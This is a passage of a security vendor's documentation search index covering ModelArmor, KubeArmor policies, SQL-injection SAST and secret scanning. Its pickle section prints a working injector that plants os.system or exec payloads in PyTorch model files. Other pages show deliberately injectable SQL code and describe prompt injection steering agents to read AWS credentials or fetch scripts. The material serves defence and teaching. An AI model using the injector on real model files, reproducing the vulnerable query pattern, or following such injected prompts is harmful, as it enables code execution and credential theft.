untrusted inputs.</p> <p>Mitigation:</p> <ul> <li>Avoid using <code>pickle</code> with untrusted sources.</li> <li>Use secure serialization libraries like <code>json</code> or <code>protobuf</code>.</li> </ul>"},{"location":"use-cases/modelarmor-adverserial-attacks/#relevant-resources","title":"Relevant Resources","text":"<ul> <li>Adversarial Attacks on Deep Learning Models</li> <li>How to Protect ML Models Against Adversarial Attacks</li> <li>Weaponizing ML Models with Ransomware</li> </ul>"},{"location":"use-cases/modelarmor-deploy-pytorch/","title":"ModelArmor Use Case: Deploying a PyTorch Application with KubeArmor","text":"<p>This guide demonstrates how to deploy a PyTorch application on Kubernetes and enhance its security using KubeArmor policies.</p>"},{"location":"use-cases/modelarmor-deploy-pytorch/#steps-to-deploy","title":"Steps to Deploy","text":"<ol> <li>Python Script: Create a simple PyTorch training script (<code>app.py</code>) to train a neural network model:</li> </ol> <pre><code>import torch\nimport torch.nn as nn\nimport torch.optim as optim\n\nclass SimpleNet(nn.Module):\n    def __init__(self):\n        super(SimpleNet, self).__init__()\n        self.fc1 = nn.Linear(10, 50)\n        self.fc2 = nn.Linear(50, 1)\n\n    def forward(self, x):\n        x = torch.relu(self.fc1(x))\n        x = self.fc2(x)\n        return x\n\n# Training process\ninput_data = torch.randn(100, 10)\ntarget_data = torch.randn(100, 1)\nmodel = SimpleNet()\ncriterion = nn.MSELoss()\noptimizer = optim.SGD(model.parameters(), lr=0.01)\n\nfor epoch in range(100):\n    optimizer.zero_grad()\n    output = model(input_data)\n    loss = criterion(output, target_data)\n    loss.backward()\n    optimizer.step()\n    if (epoch + 1) % 10 == 0:\n        print(f'Epoch [{epoch+1}/100], Loss: {loss.item():.4f}')\n\nprint(\"Training complete\")\n</code></pre> <ol> <li>Dockerize the Application: Use the following <code>Dockerfile</code> to containerize the script:</li> </ol> <pre><code>FROM pytorch/pytorch:latest\nWORKDIR /app\nCOPY . .\nCMD [\"python\", \"app.py\"]\n</code></pre> <ol> <li>Kubernetes Deployment: Define the deployment configuration in <code>pytorch-deployment.yaml</code>:</li> </ol> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pytorch-deployment\n  labels:\n    app: pytorch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pytorch\n  template:\n    metadata:\n      labels:\n        app: pytorch\n    spec:\n      containers:\n        - name: pytorch-container\n          image: yourusername/pytorch-app:latest\n          ports:\n            - containerPort: 5000\n</code></pre> <ol> <li>Service Configuration: Expose the deployment using a LoadBalancer with <code>pytorch-service.yaml</code>:</li> </ol> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: pytorch-service\nspec:\n  selector:\n    app: pytorch\n  ports:\n    - protocol: TCP\n      port: 80\n      targetPort: 5000\n  type: LoadBalancer\n</code></pre> <ol> <li>Build and Push Docker Image:</li> </ol> <pre><code>docker build -t yourusername/pytorch-app:latest .\ndocker push yourusername/pytorch-app:latest\n</code></pre> <ol> <li>Deploy on Kubernetes:</li> </ol> <pre><code>kubectl apply -f pytorch-deployment.yaml\nkubectl apply -f pytorch-service.yaml\n</code></pre> <p><code>kubectl get deployments</code></p> <p></p> <p><code>kubectl get services</code></p> <p></p> <p><code>kubectl get pods</code></p> <p></p> <ol> <li>Implement KubeArmor Policy: Secure the deployment by applying the following policy in <code>kubearmor-policy.yaml</code>:</li> </ol> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: restrict-file-access\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: pytorch\n  process:\n    matchPaths:\n      - path: /etc/shadow\n        action: Block\n      - path: /etc/passwd\n        action: Block\n  file:\n    matchDirectories:\n      - dir: /etc/\n        recursive: true\n        action: Audit\n  action: Block\n</code></pre> <p>Apply the policy:</p> <pre><code>kubectl apply -f kubearmor-policy.yaml\n</code></pre> <p></p>"},{"location":"use-cases/modelarmor-deploy-pytorch/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>This setup demonstrates how to deploy a PyTorch application using Kubernetes.</li> <li>KubeArmor enhances security by blocking unauthorized access to sensitive system files.</li> <li>The workflow includes containerization, deployment, service exposure, and runtime security enforcement.</li> </ul>"},{"location":"use-cases/modelarmor-pickle-code/","title":"ModelArmor Use Case: Pickle Code Injection PoC","text":"<p>The Pickle Code Injection Proof of Concept (PoC) demonstrates the security vulnerabilities in Python's <code>pickle</code> module, which can be exploited to execute arbitrary code during deserialization. This method is inherently insecure because it allows execution of arbitrary functions without restrictions or security checks.</p>"},{"location":"use-cases/modelarmor-pickle-code/#core-code-overview","title":"Core Code Overview","text":"<p>Custom Pickle Injector:</p> <pre><code>import os, argparse, pickle, struct, shutil\nfrom pathlib import Path\nimport torch\n\nclass PickleInject:\n    def __init__(self, inj_objs, first=True):\n        self.inj_objs = inj_objs\n        self.first = first\n\n    class _Pickler(pickle._Pickler):\n        def __init__(self, file, protocol, inj_objs, first=True):\n            super().__init__(file, protocol)\n            self.inj_objs = inj_objs\n            self.first = first\n\n        def dump(self, obj):\n            if self.proto &gt;= 2:\n                self.write(pickle.PROTO + struct.pack(\"&lt;B\", self.proto))\n            if self.first:\n                for inj_obj in self.inj_objs:\n                    self.save(inj_obj)\n            self.save(obj)\n            if not self.first:\n                for inj_obj in self.inj_objs:\n                    self.save(inj_obj)\n            self.write(pickle.STOP)\n\n    def Pickler(self, file, protocol):\n        return self._Pickler(file, protocol, self.inj_objs)\n\n    class _PickleInject:\n        def __init__(self, args, command=None):\n            self.command = command\n            self.args = args\n\n        def __reduce__(self):\n            return self.command, (self.args,)\n\n    class System(_PickleInject):\n        def __init__(self, args):\n            super().__init__(args, command=os.system)\n\n    class Exec(_PickleInject):\n        def __init__(self, args):\n            super().__init__(args, command=exec)\n\n    class Eval(_PickleInject):\n        def __init__(self, args):\n            super().__init__(args, command=eval)\n\n    class RunPy(_PickleInject):\n        def __init__(self, args):\n            import runpy\n            super().__init__(args, command=runpy._run_code)\n            def __reduce__(self):\n                return self.command, (self.args, {})\n\n# Parse Arguments\nparser = argparse.ArgumentParser(description=\"PyTorch Pickle Inject\")\nparser.add_argument(\"model\", type=Path)\nparser.add_argument(\"command\", choices=[\"system\", \"exec\", \"eval\", \"runpy\"])\nparser.add_argument(\"args\")\nargs = parser.parse_args()\n\n# Payload construction\ncommand_args = args.args\nif os.path.isfile(command_args):\n    with open(command_args, \"r\") as in_file:\n        command_args = in_file.read()\n\nif args.command == \"system\":\n    payload = PickleInject.System(command_args)\nelif args.command == \"exec\":\n    payload = PickleInject.Exec(command_args)\nelif args.command == \"eval\":\n    payload = PickleInject.Eval(command_args)\nelif args.command == \"runpy\":\n    payload = PickleInject.RunPy(command_args)\n\n# Save the injected payload\nbackup_path = f\"{args.model}.bak\"\nshutil.copyfile(args.model, backup_path)\ntorch.save(torch.load(args.model), f=args.model, pickle_module=PickleInject([payload]))\n</code></pre>"},{"location":"use-cases/modelarmor-pickle-code/#example-exploits","title":"Example Exploits","text":"<ol> <li>Print Injection:</li> </ol> <pre><code>python torch_pickle_inject.py model.pth exec \"print('hello')\"\n</code></pre> <ol> <li>Install Packages:</li> </ol> <pre><code>python torch_pickle_inject.py model.pth system \"pip install numpy\"\n</code></pre> <ol> <li>Adversarial Command Execution: Upon loading the tampered model:</li> </ol> <pre><code>python main.py\n</code></pre> <p>Output:</p> <ul> <li>Installs the package or executes the payload.</li> <li>Alters model behavior: changes predictions, losses, etc.</li> </ul>"},{"location":"use-cases/modelarmor-pickle-code/#attacker-use-cases","title":"Attacker Use Cases","text":"<ol> <li>Spreading Malware: The injected code can download and install malware on the target machine, which can then be used to infect other systems in the network or create a botnet.</li> <li>Backdoor Installation: An attacker can use pickle injection to install a backdoor that allows persistent access to the system, even if the original vulnerability is patched.</li> <li>Data Exfiltration: An attacker can use pickle injection to read sensitive files or data from the system and send it to a remote server. This can include configuration files, database credentials, or any other sensitive information stored on the machine.</li> </ol>"},{"location":"use-cases/modelarmor-pickle-code/#key-risks","title":"Key Risks","text":"<p>The <code>pickle</code> module is inherently insecure for handling untrusted input due to its ability to execute arbitrary code.</p> <p>Ref: https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC</p>"},{"location":"use-cases/modelarmor/","title":"ModelArmor - Securing Agentic AI and ML Models at Runtime","text":"<p>ModelArmor is a Zero Trust security solution purpose-built to protect AI/ML/LLM workloads from runtime threats. It safeguards against the unique risks of agentic AI systems and untrusted models by sandboxing deployments and enforcing granular runtime policies.</p> <p>ModelArmor uses KubeArmor as a sandboxing engine to ensure that the untrusted models execution is constrained and within required checks. AI/ML Models are essentially processes and allowing untrusted models to execute in AI environments have significant risks such as possibility of cryptomining attacks leveraging GPUs, remote command injections, etc. KubeArmor's preemptive mitigation mechanism provides a suitable framework for constraining the execution environment of models.</p> <p>ModelArmor can be used to enforce security policies on the model execution environment.</p>"},{"location":"use-cases/modelarmor/#why-modelarmor","title":"Why ModelArmor?","text":"<p>ModelArmor enables secure deployment of agentic AI applications and ML models, addressing critical security gaps that traditional guardrails and static scanning cannot solve.</p> <p>It is designed for:</p> <ul> <li>Agentic AI workloads using autonomous, tool-using agents.</li> <li>ML pipelines importing untrusted models from public repositories.</li> <li>Environments where guardrails alone are not sufficient.</li> </ul> <p>ModelArmor protects the entire AI lifecycle, from development to deployment, using sandboxing and policy enforcement to neutralize malicious behavior at runtime.</p>"},{"location":"use-cases/modelarmor/#the-problem-security-risks-in-agentic-ai","title":"The Problem: Security Risks in Agentic AI","text":""},{"location":"use-cases/modelarmor/#1-arbitrary-code-execution","title":"1. Arbitrary Code Execution","text":"<p>Agentic AI systems can execute arbitrary system commands due to their autonomy and access to tools.</p> <ul> <li>Prompt engineering can bypass LLM guardrails.</li> <li>Attackers can instruct agents to run harmful commands, download malware, or scan networks.</li> </ul> <p></p> <p></p>"},{"location":"use-cases/modelarmor/#2-model-supply-chain-attacks","title":"2. Model Supply Chain Attacks","text":"<p>Malicious models uploaded to public repositories (e.g., Hugging Face) can contain embedded payloads.</p> <ul> <li>Loading such models allows hidden code execution, leading to system compromise and C\\&amp;C communication.</li> </ul> <p></p>"},{"location":"use-cases/modelarmor/#3-prompt-injection-attacks","title":"3. Prompt Injection Attacks","text":"<p>Crafted prompts can manipulate the agent into performing unauthorized actions:</p> <ul> <li>Reading sensitive files (e.g., <code>/root/.aws/credentials</code>).</li> <li>Installing tools (<code>apk add nmap</code>) or scanning networks.</li> <li>Fetching and executing external scripts.</li> </ul> <p>Traditional container security cannot detect these because they exploit application behavior, not the container itself.</p> <p></p>"},{"location":"use-cases/modelarmor/#the-solution","title":"The Solution","text":""},{"location":"use-cases/modelarmor/#sandboxing-agentic-ai","title":"Sandboxing Agentic AI","text":"<p>ModelArmor isolates agentic AI apps and ML workloads at runtime, blocking unauthorized actions even if guardrails or code reviews are bypassed.</p> <p></p>"},{"location":"use-cases/modelarmor/#zero-trust-policy-enforcement","title":"Zero Trust Policy Enforcement","text":"<p>Define fine-grained security policies to:</p> <ul> <li>Restrict file system access (e.g., block <code>/root/.aws/credentials</code>).</li> <li>Control process execution (allow only trusted binaries).</li> <li>Limit network activity (disable raw sockets, ICMP, or outbound traffic).</li> </ul> <p></p>"},{"location":"use-cases/modelarmor/#automated-red-teaming","title":"Automated Red Teaming","text":"<p>Simulate adversarial scenarios like malicious model imports and prompt injections to identify vulnerabilities pre-deployment.</p>"},{"location":"use-cases/modelarmor/#protection-across-the-stack","title":"Protection Across the Stack","text":"<p>ModelArmor works across frameworks and environments:</p> <ul> <li>Supports any language runtime or AI framework.</li> <li>Requires no code changes to your application.</li> <li>Lightweight and cost-efficient, avoiding the overhead of MicroVMs or full isolation environments.</li> </ul> <p></p>"},{"location":"use-cases/modelarmor/#pytorch-based-use-cases","title":"PyTorch Based Use Cases","text":"<p>Pickle Code Injection PoC</p> <p>Adversarial Attacks on Deep Learning Models</p> <p>PyTorch App Deployment with KubeArmor</p>"},{"location":"use-cases/modelarmor/#tensorflow-based-use-cases","title":"TensorFlow Based Use Cases","text":""},{"location":"use-cases/modelarmor/#fgsm-attack-on-a-tensorflow-model","title":"FGSM Attack on a TensorFlow Model","text":"<p>An FGSM attack manipulates input data by adding imperceptible noise, creating adversarial examples that force the TensorFlow model to misclassify (e.g., predicting \u201c5\u201d for an image of \u201c2\u201d).</p> <p>Traditional container security fails here because the model and container remain unchanged; the attack happens through crafted input.</p> <p>ModelArmor Protection:</p> <ul> <li>Proactively simulates adversarial attacks using Automated Red Teaming.</li> <li>Secures model behavior with input validation and anomaly detection, akin to an LLM Prompt Firewall for ML workloads.</li> <li>Protects against sophisticated input-level manipulations.</li> </ul> <p></p>"},{"location":"use-cases/modelarmor/#keras-inject-attack-and-apply-policies","title":"Keras Inject Attack and Apply Policies","text":"<p>A deployed TensorFlow model in a Docker container is vulnerable to compromise via a malicious Keras Lambda layer. This attack involves:</p> <ul> <li>Installing Python inside the container or</li> <li>Copying malicious scripts (e.g., into <code>/tmp</code>) to execute unauthorized system commands.</li> </ul> <p>ModelArmor Protection:</p> <ul> <li>Blocks unauthorized installations (e.g., Python) and filesystem modifications (e.g., writing to <code>/tmp</code>).</li> <li>Uses Automated Red Teaming to detect such vulnerabilities pre-deployment.</li> <li>Isolates workloads (like TensorFlow) with Sandboxing Agentic AI to prevent code injection.</li> </ul> <p></p>"},{"location":"use-cases/modelarmor/#securing-nvidia-nim","title":"Securing NVIDIA NIM","text":""},{"location":"use-cases/network-segmentation/","title":"Network Segmentation","text":"<p>Identity-aware Policy Discovery and microsegmentation enables security teams such as SOC, DevSecOps teams to logically seggregate workloads into distinct security segments and have more granular control over those segments. For example segregation based on application tiers, compliance etc.</p> <p>Network segmentation is a way to have protection in east-west traffic control to prevent lateral movement within a cluster as by default, Kubernetes is a open system. AccuKnox\u2019s CWPP provides micro-segmentation at the lowest possible granularity level which is also a smallest execution unit in Kubernetes i.e. Pods. We will help you to identify process execution request emanating from a Pod, network connections its trying to make internally and externally as well as files-system its accessing. Based on the behavior of a particular pod and restricting the behavior to the expected flow of process/events/traffic, one can develop a least permissive security posture from creating a whitelisting policies and auditing/denying everything else.</p> <p>Lets understand this with an use-case example - Network Segmentation for sample app - Wordpress-mysql</p> <p>1.Review the auto discovered network policy generated for the wordpress-mysql application</p> <p></p> <p>2.Select the below network policy from All Policies screen </p> <p>3.Applying the network policy</p> <p>4.Select the network policy you want apply from the Policies screen </p> <p>5.After applying the policy, it goes into pending state</p> <p></p> <p>6.To make it active the user needs to approve</p> <p> 7.After approval the policy goes into active state</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/pod-security-admission-controller/","title":"Pod Security Admission Controller","text":"<p>Pod Security Admission (PSA) enforces security standards on a Pod's Security Context and related fields based on three levels defined by the Pod Security Standards:</p> <ol> <li>Privileged: Unrestricted policy, allows known privilege escalations.</li> <li>Baseline: Minimally restrictive policy, allows default (minimally specified) Pod configuration.</li> <li>Restricted: Heavily restricted policy, adhering to current Pod hardening best practices.</li> </ol> <p>PSA can be enabled in two modes:</p> <ol> <li>Enforce: Policy violations will cause the pod to be rejected.</li> <li>Audit: Policy violations will trigger an alert but still allow the pod.</li> </ol>"},{"location":"use-cases/pod-security-admission-controller/#enabling-pod-security-admission-psa","title":"Enabling Pod Security Admission (PSA)","text":"<ol> <li>Navigate to Inventory \u2192 Clusters and click on the cluster, then select View Workloads.</li> </ol> <ol> <li>Click on the cog icon next to the namespace.</li> </ol> <ol> <li>Select the desired PSA Level and click Save.</li> </ol> <ol> <li>Select the desired Mode for PSA.</li> </ol> <ol> <li>If using Enforce mode, click on Dry Run to preview potential effects before applying.</li> </ol> <p>The Dry Run mode allows users to confirm potential effects of the PSA. Once reviewed and acceptable, click Save to apply the PSA.</p>"},{"location":"use-cases/pod-security-admission-controller/#psa-protection-example","title":"PSA Protection Example","text":"<p>After setting PSA to enforce the restricted level, attempt to run a privileged Pod in the cluster:</p> <pre><code>root@demo:~# kubectl run nginx --image=nginx\n</code></pre> <p>An error will be returned as shown below:</p> <pre><code>Error from server (Forbidden): pods \"nginx\" is forbidden: violates PodSecurity \"restricted:latest\": allowPrivilegeEscalation != false (container \"nginx\" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container \"nginx\" must set securityContext.capabilities.drop=[\"ALL\"]), runAsNonRoot != true (pod or container \"nginx\" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container \"nginx\" must set securityContext.seccompProfile.type to \"RuntimeDefault\" or \"Localhost\")\n</code></pre> <p>Since the restricted PSA label was applied to the namespace, attempting to create a pod with excessive privileges results in this error, successfully preventing the privileged pod from running.</p>"},{"location":"use-cases/prompts-categories/","title":"Prompts categories","text":""},{"location":"use-cases/rules-engine-ticket-creation/","title":"Automated Ticket Creation using Rules Engine","text":"<p>The Rules Engine allows users to customize and automate ticket creation by selecting the data type, defining the criticality, and configuring specific ticket settings. This ensures that customized tickets are created whenever the selected criteria is met, providing more control over the ticketing process.</p> <p>In this section we can find the steps to create a ticket using Rule Engine in the AccuKnox platform.</p>"},{"location":"use-cases/rules-engine-ticket-creation/#prerequisites","title":"Prerequisites","text":"<p>A ticketing platform integrated to AccuKnox with a ticketing configuration created</p> <p>Note: If the ticketing platform is not integrated yet, please follow the steps specified in the Ticketing section for the platform you are using.</p>"},{"location":"use-cases/rules-engine-ticket-creation/#steps-to-set-up-automated-ticket-creation","title":"Steps to set up Automated Ticket Creation","text":"<p>Step 1: Log in to the AccuKnox platform and navigate to Issues \u2192 Findings </p> <p>Step 2: Hover over to Rule Engine in Findings (Issues&gt;Findings&gt;Rule Engine) </p> <p>Step 3: Click on Create Rule to create an automated rule. </p> <p>Step 4: Provide the necessary details</p> <ul> <li> <p>Name: A name to uniquely identify the rule</p> </li> <li> <p>Description: A few words to help understand the functionality of the rule</p> </li> <li> <p>Condition: The criteria to be checked against findings to apply the rule. Multiple conditions can be specified in a single rule and all the conditions must match for the rule to be applicable.</p> </li> <li> <p>Expiration: The time when this rule will become inactive, can be set to custom date. The rule will need to be updated after expiration.</p> </li> </ul> <p></p> <p>Step 5: Click on Add Action. In the Action tab, select Create Ticket and close.</p> <p></p> <p>Step 6: After confirming the action, select the ticket configuration to be used to create the ticket from the dropdown.</p> <p></p> <p>Step 7: The Save button is enabled after all the fields have been filled. Click on Save</p> <p></p> <p>The rule has been created successfully and will create tickets for all findings that match the condition.</p>"},{"location":"use-cases/sast-sq/","title":"SAST with Opengrep and AccuKnox: Detecting SQL Injection Vulnerabilities","text":"<p>In this guide, we'll walk through integrating Opengrep for Static Application Security Testing (SAST) and AccuKnox for continuous security monitoring of Python code to detect SQL Injection vulnerabilities in your CI/CD pipeline.</p> <p>\ud83d\udd17 Check it out on GitHub Marketplace: AccuKnox-Opengrep SAST Scanner</p>"},{"location":"use-cases/sast-sq/#scenario","title":"Scenario","text":"<p>You are maintaining a Python application, and your CI/CD pipeline automatically deploys changes to your application. You want to ensure that your code is checked for security vulnerabilities, especially SQL Injection attacks, which can compromise your application and data.</p> <p>The solution is to integrate Opengrep for scanning the Python code in your CI/CD pipeline and forward the results to AccuKnox for further analysis and issue tracking.</p>"},{"location":"use-cases/sast-sq/#objective","title":"Objective","text":"<p>Integrate Opengrep into your CI/CD pipeline to detect SQL Injection vulnerabilities in Python code. Forward the scan results to AccuKnox to help track and manage security issues.</p>"},{"location":"use-cases/sast-sq/#tools","title":"Tools","text":"<ul> <li> <p>AccuKnox -- CNAPP platform</p> </li> <li> <p>GitHub Actions -- CI/CD platform (similar to GitLab CI, Jenkins, etc.)</p> </li> </ul>"},{"location":"use-cases/sast-sq/#steps","title":"Steps","text":""},{"location":"use-cases/sast-sq/#1-vulnerable-python-code-example","title":"1. Vulnerable Python Code Example","text":"<p>This Python code contains a SQL Injection vulnerability where user input is concatenated directly into a SQL query, allowing an attacker to manipulate the query.</p> <pre><code>import sqlite3\n\ndef get_user_data(username):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n\n    # VULNERABLE SQL QUERY: User input is directly injected into the query.\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"';\"\n\n    cursor.execute(query)\n    user_data = cursor.fetchall()\n\n    conn.close()\n\n    return user_data\n\n# Example of how the vulnerable function could be called\nusername_input = input(\"Enter your username: \")\nprint(get_user_data(username_input))\n</code></pre> <p>Explanation:</p> <ul> <li> <p>The code directly injects user input into the SQL query, which opens the door for SQL Injection attacks.</p> </li> <li> <p>An attacker can provide input like <code>\" OR '1'='1\"</code> to manipulate the query and gain unauthorized access to data.</p> </li> </ul>"},{"location":"use-cases/sast-sq/#2-github-actions-workflow-integration","title":"2. GitHub Actions Workflow Integration","text":"<p>Create a GitHub Actions workflow at <code>.github/workflows/sast.yml</code>:</p> <pre><code>name: AccuKnox SAST Scan Workflow\n\non:\n  push:\n    branches:\n      - sast\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: Accuknox SAST\n        uses: accuknox/sast-scan-opengrep-action@1.0.0\n        with:\n          accuknox_token: ${{ secrets.ACCUKNOX_TOKEN }}\n          accuknox_endpoint: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          accuknox_tenant: ${{ secrets.ACCUKNOX_TENANT_ID }}\n          accuknox_label: ${{ secrets.ACCUKNOX_LABEL }}\n          input_soft_fail: false\n</code></pre> <ul> <li> <p>Triggers on push or pull request to the <code>main</code> branch.</p> </li> <li> <p>Runs the Opengrep scan on the code.</p> </li> <li> <p>Uploads the results to AccuKnox for further analysis.</p> </li> </ul>"},{"location":"use-cases/sast-sq/#4-before-accuknox-integration","title":"4. Before AccuKnox Integration","text":"<p>Without AccuKnox in your pipeline, any push containing the above vulnerable Python code would be deployed without any security checks, potentially exposing your application to SQL Injection attacks.</p>"},{"location":"use-cases/sast-sq/#5-after-accuknox-integration","title":"5. After AccuKnox Integration","text":"<p>Once the AccuKnox scan is integrated:</p> <ul> <li> <p>Every push or pull request to <code>main</code> triggers the scan.</p> </li> <li> <p>SQL Injection vulnerabilities will be detected and flagged.</p> </li> <li> <p>Results are uploaded to AccuKnox for detailed analysis and remediation tracking.</p> </li> </ul> <p></p>"},{"location":"use-cases/sast-sq/#viewing-the-results-in-accuknox","title":"Viewing the Results in AccuKnox","text":"<ul> <li> <p>Log into AccuKnox and navigate to Issues \u2192 Findings.</p> </li> <li> <p>Filter by Data Type: Opengrep SAST Scan and search for the findings related to your repository.</p> </li> </ul> <p></p> <ul> <li>Detailed information will be provided, including the severity of the vulnerability and suggested remediation.</li> </ul> <p></p>"},{"location":"use-cases/sast-sq/#6-remediating-the-vulnerability","title":"6. Remediating the Vulnerability","text":""},{"location":"use-cases/sast-sq/#61-create-a-ticket","title":"6.1 Create a Ticket","text":"<ul> <li> <p>You can create a ticket directly from AccuKnox Findings by integrating your organization's ticketing system (Jira, ServiceNow, etc.) with AccuKnox.</p> </li> <li> <p>This ensures vulnerabilities detected during scans are automatically or manually ticketed for tracking and resolution.</p> </li> <li> <p>Refer to the integration guide for setup:   \ud83d\udd17 AccuKnox Jira Cloud Integration Guide</p> </li> </ul> <p></p>"},{"location":"use-cases/sast-sq/#62-fix-the-code","title":"6.2 Fix the Code","text":"<ul> <li> <p>After fixing the vulnerability, rerun the pipeline.</p> </li> <li> <p>Navigate to the AccuKnox dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"use-cases/sast-sq/#conclusion","title":"Conclusion","text":"<p>By integrating Opengrep for SAST scans and forwarding the results to AccuKnox, you can automate the detection and resolution of security vulnerabilities like SQL Injection in your Python codebase. This setup ensures that potential security risks are caught early in the CI/CD pipeline, providing a robust defense for your application.</p>"},{"location":"use-cases/secret-scan-cicd-aws/","title":"How to Prevent AWS Key Leaks: Secret Scanning in CI/CD Pipeline","text":"<p>Exposing credentials in public repositories is not a theoretical risk --- it causes real financial damage. This guide shows how to integrate AccuKnox Secret Scanning into GitHub Actions to proactively catch secrets before they leak, using a real AWS breach incident as a case study.</p> <p>\ud83d\udd17 Check it out on GitHub Marketplace: AccuKnox Secret Scanner</p>"},{"location":"use-cases/secret-scan-cicd-aws/#scenario-aws-s3-keys-committed-to-github-45000-loss","title":"Scenario: AWS S3 Keys Committed to GitHub \u2192 $45,000 Loss","text":"<p>An engineering team mistakenly committed AWS S3 access keys into their GitHub repository. Although the repository was private initially, a misconfigured settings change made it public for several hours. In that window, attackers found the keys, deployed unauthorized EC2 instances for crypto mining, and ran up $45,000 in AWS charges.</p> <p>Key mistakes:</p> <ul> <li> <p>No automated secret scanning in CI/CD.</p> </li> <li> <p>Manual code review missed the committed keys.</p> </li> <li> <p>Delay in detecting leaked secrets.</p> </li> </ul>"},{"location":"use-cases/secret-scan-cicd-aws/#objective-prevent-secret-leaks","title":"Objective: Prevent Secret Leaks","text":"<p>The goal is to automatically detect and prevent the exposure of sensitive data (e.g., AWS keys) in your codebase by integrating AccuKnox Secret Scanning into your CI/CD pipeline. This ensures secrets are caught early, reducing risk and preventing potential exploitation.</p>"},{"location":"use-cases/secret-scan-cicd-aws/#steps-overview","title":"Steps Overview","text":"<ul> <li> <p>Manual Setup: Detect Secrets in Code</p> </li> <li> <p>Integrate AccuKnox Secret scanning into the CI/CD Pipeline</p> </li> <li> <p>Before vs After Integration</p> </li> <li> <p>Viewing Findings: Analyze Results</p> </li> <li> <p>Remediation Workflow</p> </li> </ul>"},{"location":"use-cases/secret-scan-cicd-aws/#1-why-manual-secret-detection-fails","title":"1. Why Manual Secret Detection Fails","text":"<p>Manual methods (grep commands, peer reviews) are unreliable at scale:</p> <ul> <li> <p>Developers can overlook sensitive patterns.</p> </li> <li> <p>Reviewers focus on functionality, not hidden secrets.</p> </li> <li> <p>Fast development cycles make mistakes inevitable.</p> </li> </ul> <p>Automation is the only scalable defense.</p>"},{"location":"use-cases/secret-scan-cicd-aws/#2-github-actions-integration-accuknox-secret-scanning-setup","title":"2. GitHub Actions Integration: AccuKnox Secret Scanning Setup","text":"<p>We will configure GitHub Actions to automatically scan for secrets on every code change.</p> <p>Create a GitHub Actions workflow at <code>.github/workflows/secret.yml</code>:</p> <pre><code>name: AccuKnox Secret Scan Workflow\n\non:\n  push:\n    branches:\n      - secret\n\njobs:\n  accuknox-cicd:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: AccuKnox Secret Scan\n        uses: accuknox/secret-scan-action@v1.0.1\n        with:\n          token: ${{ secrets.ACCUKNOX_TOKEN }}\n          tenant_id: ${{ secrets.ACCUKNOX_TENANT_ID }}\n          label: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          endpoint: ${{ secrets.ACCUKNOX_LABEL }}\n          fail: true\n          use_extended_ruleset: false\n</code></pre>"},{"location":"use-cases/secret-scan-cicd-aws/#how-it-works","title":"How It Works","text":"<ul> <li> <p>Checkout: Clones the full repo (including history) to detect secrets in past commits.</p> </li> <li> <p>Scan: Runs AccuKnox Secret Scanning using your tenant's API token and endpoint.</p> </li> <li> <p>Fail: If secrets are found, the build fails immediately to block unsafe merges.</p> </li> </ul> <p>Result: Developers get immediate feedback before secrets hit production.</p>"},{"location":"use-cases/secret-scan-cicd-aws/#3-risks-without-integration","title":"3. Risks Without Integration","text":"<p>If you skip secret scanning:</p> <ul> <li> <p>Leaked credentials can be exploited within minutes.</p> </li> <li> <p>You risk cloud abuse, ransomware, or compliance penalties</p> </li> <li> <p>Damage control is expensive and time-consuming.</p> </li> </ul>"},{"location":"use-cases/secret-scan-cicd-aws/#4-benefits-after-integration","title":"4. Benefits After Integration","text":"<p>With AccuKnox Secret Scanning:</p> <ul> <li> <p>Automatic secret detection on every PR and push.</p> </li> <li> <p>Faster incident prevention --- catch issues before they escalate.</p> </li> <li> <p>Better compliance posture</p> </li> <li> <p>Cleaner, safer repositories with no embedded secrets.</p> </li> </ul> <p></p>"},{"location":"use-cases/secret-scan-cicd-aws/#5-viewing-findings-in-the-accuknox-dashboard","title":"5. Viewing Findings in the AccuKnox Dashboard","text":"<p>After a scan:</p> <ol> <li> <p>Log into AccuKnox and navigate to Issues \u2192 Findings.</p> </li> <li> <p>Filter by Data Type: Secret Scan and search for the findings related to your repository.     </p> </li> <li> <p>View detailed reports with:</p> <pre><code>- Detected secret type (AWS Key, Database Password, etc.)\n\n- File path\n\n- Commit SHA\n\n- Developer responsible\n</code></pre> <p></p> </li> </ol>"},{"location":"use-cases/secret-scan-cicd-aws/#6-remediating-detected-secrets","title":"6. Remediating Detected Secrets","text":""},{"location":"use-cases/secret-scan-cicd-aws/#61-create-a-ticket","title":"6.1 Create a Ticket","text":"<ul> <li> <p>You can create a ticket directly from AccuKnox Findings by integrating your organization's ticketing system (Jira, ServiceNow, etc.) with AccuKnox.</p> </li> <li> <p>This ensures vulnerabilities detected during scans are automatically or manually ticketed for tracking and resolution.</p> </li> <li> <p>Refer to the integration guide for setup:   \ud83d\udd17 AccuKnox Jira Cloud Integration Guide</p> </li> </ul> <p></p>"},{"location":"use-cases/secret-scan-cicd-aws/#62-revoke-and-rotate-credentials","title":"6.2: Revoke and Rotate Credentials","text":"<ul> <li> <p>Immediately revoke compromised keys (AWS IAM, database, etc.).</p> </li> <li> <p>Rotate secrets and update configurations safely (using Vault, AWS Secrets Manager, etc.).</p> </li> <li> <p>Remove secrets from commit history (use <code>git filter-repo</code> or <code>BFG Repo Cleaner</code>).</p> </li> </ul>"},{"location":"use-cases/secret-scan-cicd-aws/#63-rerun-scans-and-verify","title":"6.3: Rerun Scans and Verify","text":"<ul> <li> <p>Recommit and push the clean changes.</p> </li> <li> <p>Trigger a new GitHub Actions pipeline run.</p> </li> <li> <p>Confirm no secrets are detected by AccuKnox.</p> </li> <li> 